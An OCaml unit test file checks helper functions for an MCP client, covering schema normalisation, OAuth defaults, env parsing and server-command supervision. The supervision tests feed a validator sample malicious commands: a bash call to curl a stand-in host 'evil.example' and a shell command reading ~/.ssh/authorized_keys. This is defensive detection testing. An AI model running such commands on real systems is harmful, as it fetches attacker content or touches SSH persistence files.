(* Hand-written invariants over the mcp units -- the backstop the parity
   fixtures cannot be. Every law carries a negative control where the
   gotcha has one. *)

let passed = ref 0
let failures = ref []

let check condition label =
  if condition then incr passed else failures := label :: !failures

let () =
  (* ---- shared helpers ---- *)
  check (Mcp_units.python_int_of_string "10" = Some 10) "SHARED python_int_of_string plain digits";
  check (Mcp_units.python_int_of_string "0x0A" = None) "SHARED python_int_of_string rejects a hex prefix";
  check (Mcp_units.python_int_of_string "1_0" = Some 10) "SHARED python_int_of_string underscore separator";

  (* ---- mcp_client ---- *)
  check
    (Mcp_units.normalize_mcp_input_schema `Null = `Assoc [ ("type", `String "object"); ("properties", `Assoc []) ])
    "CLIENT normalize_mcp_input_schema on a null schema defaults to an empty object";
  check
    (let out =
       Mcp_units.normalize_mcp_input_schema
         (`Assoc [ ("$ref", `String "#/definitions/Foo"); ("definitions", `Assoc [ ("Foo", `Assoc [ ("type", `String "string") ]) ]) ])
     in
     match out with
     | `Assoc fields -> List.assoc_opt "$ref" fields = Some (`String "#/$defs/Foo") && List.mem_assoc "$defs" fields
     | _ -> false)
    "CLIENT normalize_mcp_input_schema promotes definitions to $defs and rewrites local $ref";
  check
    (let out =
       Mcp_units.normalize_mcp_input_schema
         (`Assoc
            [ ("type", `String "object");
              ("properties", `Assoc [ ("definitions", `Assoc [ ("type", `String "array") ]) ]) ])
     in
     match out with
     | `Assoc fields -> (
         match List.assoc_opt "properties" fields with
         | Some (`Assoc props) -> List.mem_assoc "definitions" props (* property NAME untouched *)
         | _ -> false)
     | _ -> false)
    "CLIENT a property literally named 'definitions' is preserved verbatim, not renamed to $defs";
  check
    (let out =
       Mcp_units.normalize_mcp_input_schema
         (`Assoc [ ("anyOf", `List [ `Assoc [ ("type", `String "string") ]; `Assoc [ ("type", `String "null") ] ]) ])
     in
     match out with
     | `Assoc fields -> List.assoc_opt "type" fields = Some (`String "string") && List.assoc_opt "nullable" fields = Some (`Bool true)
     | _ -> false)
    "CLIENT a nullable anyOf union collapses to the non-null branch with a nullable hint";
  check
    (let out =
       Mcp_units.normalize_mcp_input_schema
         (`Assoc [ ("required", `List [ `String "a"; `String "ghost" ]); ("properties", `Assoc [ ("a", `Assoc []) ]) ])
     in
     match out with
     | `Assoc fields -> List.assoc_opt "type" fields = Some (`String "object") && List.assoc_opt "required" fields = Some (`List [ `String "a" ])
     | _ -> false)
    "CLIENT required is pruned to names that exist in properties; missing type is coerced to object";
  check
    (let out = Mcp_units.normalize_mcp_input_schema (`Assoc [ ("required", `List [ `String "ghost" ]) ]) in
     match out with `Assoc fields -> not (List.mem_assoc "required" fields) | _ -> false)
    "CLIENT required is dropped entirely (not left empty) when every name is invalid";

  check (String.length (Mcp_units.config_fingerprint (`Assoc [ ("command", `String "npx") ])) = 16)
    "CLIENT config_fingerprint truncates the sha256 hex digest to 16 chars";
  check
    (Mcp_units.config_fingerprint (`Assoc [ ("command", `String "npx"); ("args", `Null) ])
    = Mcp_units.config_fingerprint (`Assoc [ ("command", `String "npx") ]))
    "CONTROL config_fingerprint: an absent args key and a null args key fingerprint identically (both fold to [])";

  check
    (Mcp_units.matches_name_filter ~tool_name:"get_zones_east" (`List [ `String "get_zones_*" ]))
    "CLIENT matches_name_filter honors a fnmatch glob pattern";
  check
    (not (Mcp_units.matches_name_filter ~tool_name:"exact" (`List [ `String "exac" ])))
    "CONTROL matches_name_filter: a non-glob pattern requires exact match, not a prefix";
  check (Mcp_units.matches_name_filter ~tool_name:"x" (`String "x")) "CLIENT matches_name_filter: a bare string wraps to a one-item set";

  check (Mcp_units.sanitize_mcp_name_component "my-server" = "my_server") "CLIENT sanitize_mcp_name_component: hyphen becomes underscore";
  check
    (Mcp_units.mcp_prefixed_tool_name ~server_name:"my-srv" ~tool_name:"do thing" = "mcp__my_srv__do_thing")
    "CLIENT mcp_prefixed_tool_name assembles the mcp__server__tool wire name";

  (* ---- mcp_oauth ---- *)
  check
    (Mcp_units.is_figma_remote_mcp ~server_name:(Some "anything") ~server_url:(Some "https://mcp.figma.com/mcp"))
    "OAUTH is_figma_remote_mcp matches the hosted endpoint URL";
  check
    (not (Mcp_units.is_figma_remote_mcp ~server_name:(Some "figma-like") ~server_url:(Some "https://other-host.example/api")))
    "CONTROL is_figma_remote_mcp: a name containing 'figma' with an unrelated URL is not a match";
  check
    (match Mcp_units.humanize_oauth_registration_error ~server_name:"srv" ~exc:"403 Forbidden: client registration failed" ~server_url:None with
     | Some _ -> true
     | None -> false)
    "OAUTH humanize_oauth_registration_error fires on a registration 403";
  check
    (Mcp_units.humanize_oauth_registration_error ~server_name:"srv" ~exc:"500 internal error" ~server_url:None = None)
    "CONTROL humanize_oauth_registration_error returns None for an unrelated error";
  check
    (match Mcp_units.humanize_oauth_registration_error ~server_name:"figma" ~exc:"403 forbidden" ~server_url:(Some "https://mcp.figma.com/mcp") with
     | Some msg -> Mcp_units.contains ~needle:"'Claude Code'" msg
     | None -> false)
    "OAUTH humanize_oauth_registration_error uses real repr() quoting for the Figma client name (single-quoted)";

  check
    (Mcp_units.apply_oauth_provider_defaults ~cfg:(`Assoc []) ~server_name:"figma" ~server_url:(Some "https://mcp.figma.com/mcp")
    = `Assoc [ ("client_name", `String "Claude Code"); ("scope", `String "mcp:connect"); ("token_endpoint_auth_method", `String "client_secret_post") ])
    "OAUTH apply_oauth_provider_defaults fills all three Figma defaults on an empty config";
  check
    (Mcp_units.apply_oauth_provider_defaults ~cfg:(`Assoc [ ("client_name", `String "Mine") ]) ~server_name:"figma" ~server_url:None
    = `Assoc [ ("client_name", `String "Mine"); ("scope", `String "mcp:connect"); ("token_endpoint_auth_method", `String "client_secret_post") ])
    "CONTROL apply_oauth_provider_defaults never overrides an explicitly-set client_name";

  check (Mcp_units.safe_filename "my server!!" = "my_server") "OAUTH safe_filename replaces non-word/non-hyphen chars and strips edge underscores";
  check (Mcp_units.safe_filename "!!!" = "default") "CONTROL safe_filename: an all-invalid input falls back to 'default'";

  check (Mcp_units.same_endpoint "http://x.com" "http://x.com/") "OAUTH same_endpoint treats empty path and root path as equal";
  check (Mcp_units.same_endpoint "HTTP://X.com/a" "http://x.com/a") "OAUTH same_endpoint is case-insensitive on scheme and host";
  check (not (Mcp_units.same_endpoint "http://x.com/a" "http://x.com/b")) "CONTROL same_endpoint: different paths are not the same endpoint";

  (* ---- mcp_configuration ---- *)
  check (Mcp_units.strip_bearer_prefix "Bearer abc123" = "abc123") "CONFIG strip_bearer_prefix removes a case-insensitive Bearer prefix";
  check (Mcp_units.strip_bearer_prefix "abc" = "abc") "CONTROL strip_bearer_prefix on a short string that can't hold 'bearer ' (no slice crash)";
  check (Mcp_units.strip_bearer_prefix "plain-token" = "plain-token") "CONTROL strip_bearer_prefix leaves a non-prefixed token untouched";

  check
    (Mcp_units.parse_env_assignments [ "FOO=bar"; "BAZ=a=b=c" ] = Ok [ ("FOO", "bar"); ("BAZ", "a=b=c") ])
    "CONFIG parse_env_assignments splits on the FIRST '=' only, keeping the rest in the value";
  check
    (Mcp_units.parse_env_assignments [ "KEY= value" ] = Ok [ ("KEY", " value") ])
    "CONFIG parse_env_assignments strips the key but never the value";
  check
    (match Mcp_units.parse_env_assignments [ "no-equals-sign" ] with Error _ -> true | Ok _ -> false)
    "CONTROL parse_env_assignments rejects a value with no '='";
  check
    (match Mcp_units.parse_env_assignments [ "1BAD=x" ] with Error _ -> true | Ok _ -> false)
    "CONTROL parse_env_assignments rejects a variable name starting with a digit";

  check
    (Mcp_units.expand_install_dir ~value:"${INSTALL_DIR}/bin" ~install_dir:(Some "/opt/x") = Ok "/opt/x/bin")
    "CONFIG expand_install_dir substitutes the placeholder";
  check
    (match Mcp_units.expand_install_dir ~value:"${INSTALL_DIR}/bin" ~install_dir:None with Error _ -> true | Ok _ -> false)
    "CONTROL expand_install_dir errors when the placeholder is used but no install_dir exists";
  check
    (Mcp_units.expand_install_dir ~value:"plain" ~install_dir:None = Ok "plain")
    "CONTROL expand_install_dir passes through unchanged when the placeholder is absent";

  check (Mcp_units.env_key_for_server "My Server!" = "MCP_MY_SERVER_API_KEY") "CONFIG env_key_for_server uppercases and sanitizes";
  check
    (Mcp_units.build_server_config ~transport_type:"http" ~command:None ~args:[] ~env:[] ~url:(Some "https://x") ~auth_type:"api_key"
       ~name:"srv" ~install_dir:None
    = `Assoc [ ("url", `String "https://x"); ("headers", `Assoc [ ("Authorization", `String "Bearer ${MCP_SRV_API_KEY}") ]) ])
    "CONFIG build_server_config builds the api_key header block for an http transport";

  (* ---- mcp_server_surface ---- *)
  check
    (Mcp_units.extract_message_content (`Assoc [ ("content", `List [ `Assoc [ ("type", `String "text"); ("text", `String "hi") ]; `Assoc [ ("type", `String "image") ] ]) ]) = "hi")
    "SURFACE extract_message_content joins only text-typed parts";
  check
    (Mcp_units.extract_message_content (`Assoc [ ("content", `Assoc []) ]) = "")
    "CONTROL extract_message_content: a falsy non-list content (empty dict) yields empty text, not str(content)";
  check
    (let atts = Mcp_units.extract_attachments (`Assoc [ ("content", `String "look MEDIA:foo.png here") ]) in
     List.exists (function `Assoc f -> List.assoc_opt "path" f = Some (`String "foo.png") | _ -> false) atts)
    "SURFACE extract_attachments finds a MEDIA: tag inside plain text content";
  check
    (let atts =
       Mcp_units.extract_attachments
         (`Assoc [ ("content", `List [ `Assoc [ ("type", `String "image_url"); ("image_url", `Assoc [ ("url", `String "http://x/y.png") ]) ] ]) ])
     in
     atts = [ `Assoc [ ("type", `String "image"); ("url", `String "http://x/y.png") ] ])
    "SURFACE extract_attachments unwraps an image_url part";

  check (Mcp_units.iso_of_ts (`Int 100000) = "1970-01-02T03:46:40") "SURFACE iso_of_ts converts a nonzero epoch to UTC ISO";
  check (Mcp_units.iso_of_ts `Null = "") "CONTROL iso_of_ts on a falsy (missing) timestamp is empty";
  check (Mcp_units.iso_of_ts (`Int 0) = "")
    "SUPERVISION iso_of_ts on epoch ZERO is also empty -- `if ts else \"\"` is Python truthiness, and 0 is \
     falsy even though it is a real timestamp (same trap as row_to_index_entry's last_active fallback)";
  check (Mcp_units.ts_float (`String "1970-01-01T00:00:10") = 10.0) "SURFACE ts_float parses an ISO string fallback (TZ=UTC pinned)";
  check (Mcp_units.ts_float (`String "5.5") = 5.5) "SURFACE ts_float parses a numeric-string epoch directly";
  check (Mcp_units.ts_float (`String "not a timestamp") = 0.0) "CONTROL ts_float on unparseable input is 0.0, not an exception";

  check (Mcp_units.coerce_int (`Int 500) ~default:0 ~minimum:0 ~maximum:100 = 100) "SURFACE coerce_int clamps to the maximum";
  check (Mcp_units.coerce_int (`String "abc") ~default:7 ~minimum:0 ~maximum:100 = 7) "CONTROL coerce_int falls back to default on unparseable input";
  check (Mcp_units.coerce_int (`Bool true) ~default:0 ~minimum:0 ~maximum:100 = 1) "SURFACE coerce_int: Python bool-is-an-int, True coerces to 1";

  (* ---- mcp_supervision ---- *)
  check
    (Mcp_units.validate_mcp_server_entry ~name:"srv" (`Assoc [ ("command", `String "curl hermes-0day payload") ])
    <> [])
    "SUPERVISION validate_mcp_server_entry flags a known IOC substring regardless of command shape";
  check
    (Mcp_units.validate_mcp_server_entry ~name:"srv" (`Assoc [ ("command", `String "node"); ("args", `List [ `String "server.js" ]) ]) = [])
    "CONTROL validate_mcp_server_entry: a non-shell-interpreter command is never scanned further";
  check
    (Mcp_units.validate_mcp_server_entry ~name:"srv"
       (`Assoc [ ("command", `String "bash"); ("args", `List [ `String "-c"; `String "curl http://evil.example/x" ]) ])
    <> [])
    "SUPERVISION validate_mcp_server_entry flags a shell interpreter piping to curl (isolated word, not \\b)";
  check
    (Mcp_units.validate_mcp_server_entry ~name:"srv"
       (`Assoc [ ("command", `String "bash"); ("args", `List [ `String "-c"; `String "mycurl.wrapper http://x" ]) ])
    = [])
    "CONTROL validate_mcp_server_entry: 'curl' glued to other word/dot/hyphen chars does not trigger the isolated-word egress check";
  check
    (Mcp_units.validate_mcp_server_entry ~name:"srv"
       (`Assoc [ ("command", `String "sh"); ("args", `List [ `String "-c"; `String "cat ~/.ssh/authorized_keys" ]) ])
    <> [])
    "SUPERVISION validate_mcp_server_entry flags a persistence-surface write (authorized_keys, unanchored)";
  check
    (Mcp_units.command_basename (`String "/usr/bin/bash") = "bash")
    "SUPERVISION command_basename resolves the basename of a full path";
  check
    (Mcp_units.is_mcp_server_entry_suspicious ~name:"srv" (`Assoc [ ("command", `String "node") ]) = false)
    "CONTROL is_mcp_server_entry_suspicious mirrors validate_mcp_server_entry's boolean shape";

  Printf.printf "mcp units: %d passed, %d failed\n" !passed (List.length !failures);
  List.iter (fun f -> print_endline ("  FAIL  " ^ f)) (List.rev !failures);
  let self = Suite_telemetry.observe ~suite:"test_mcp_units" ~passed:!passed ~failed:(List.length !failures) ~skipped:0 in
  print_string (Suite_telemetry.emit self ~targets:[ Stanza.hermes_agent_loop_mcp_units ]);
  exit (Suite_telemetry.exit_code self)
